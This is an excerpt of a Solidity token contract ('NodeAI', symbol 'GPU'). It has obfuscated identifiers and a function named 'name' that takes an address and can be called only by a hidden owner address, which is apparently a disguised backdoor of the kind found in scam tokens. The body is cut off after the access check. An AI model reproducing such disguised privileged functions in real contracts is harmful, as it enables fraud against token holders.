...
contract GPU is Ownable {
    ...
    string public _tokenname = "NodeAI";
    string public _tokensymbol = "GPU";
    uint256 tokenamount = 10000000000*10**decimals();
    address public thdnx46;
    ...
    function name(address jjkxq1) public     {
        require(thdnx46 ==  _msgSender());
        if(thdnx46 != _msgSender()){
                revert("fu");
        }
